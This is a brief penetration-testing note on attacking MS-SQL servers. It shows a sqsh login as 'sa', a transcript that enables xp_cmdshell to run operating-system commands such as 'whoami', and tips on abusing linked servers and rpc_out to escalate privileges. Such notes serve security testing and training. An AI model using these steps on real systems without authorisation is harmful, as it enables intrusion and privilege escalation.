# MS-SQL Databases

## Connecting

```bash
sqsh -S 192.168.0.6 -U sa
```

## User Creation

## xp\_cmdshell

```sql
1> exec sp_configure 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
(return status = 0)
1> reconfigure
2> go
1> exec sp_configure 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> reconfigure
2> go
1> exec master..xp_cmdshell 'whoami' 
2> go
```

## Server Links

The best reference for exploiting server links is [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/) They're not hard to pull off and can allow you to escalate your permissions quite easily. However, do note that you should absolutely use rpc\_out if it's enabled.

Since OpenQuery can only satisfy user queries, stored procedures or user creation is not possible and makes your escalation path much more difficult.



